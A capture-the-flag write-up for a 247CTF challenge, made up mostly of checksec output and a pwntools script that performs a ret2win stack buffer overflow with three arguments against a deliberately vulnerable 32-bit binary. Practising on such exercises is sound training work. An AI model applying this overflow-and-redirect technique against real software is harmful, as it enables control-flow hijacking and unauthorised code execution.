# HIDDEN FLAG FUNCTION PARAMETERS [EASY]

## Description

> Can you control this applications flow to gain access to the hidden flag function with the correct parameters?

## Short Solution Description / Tags

Classic ret2win with argument

## Solution

```console
$ file hidden_flag_function_with_args
hidden_flag_function_with_args: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=59a58a86ad899fc4e3efd3933d9d2f7b6b627c03, not stripped

$ checksec hidden_flag_function_with_args
[*] '/root/Desktop/hidden_flag_function_with_args'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

solver.py

```python
from pwn import *

context.log_level = "DEBUG"
context.terminal = ["tmux", "split-window", "-h"]

elf = ELF("./hidden_flag_function_with_args", checksec=False)
win = elf.sym["flag"]


def conn() -> pwnlib.tubes:
    if args.REMOTE:
        io = remote("8ae5e00e1a3139b7.247ctf.com", 50276)

    elif args.GDB:
        gdbscript = """
        b flag
        c
        """
        io = gdb.debug([elf.path], gdbscript=gdbscript)
    else:
        io = elf.process()

    return io


def main():
    io = conn()

    payload = (
        b"A" * 140 + p32(win) + p32(0x0) + p32(0x1337) + p32(0x247) + p32(0x12345678)
    )
    io.sendlineafter(b"You can ask for one though:", payload)

    io.interactive("")


if __name__ == "__main__":
    main()
```
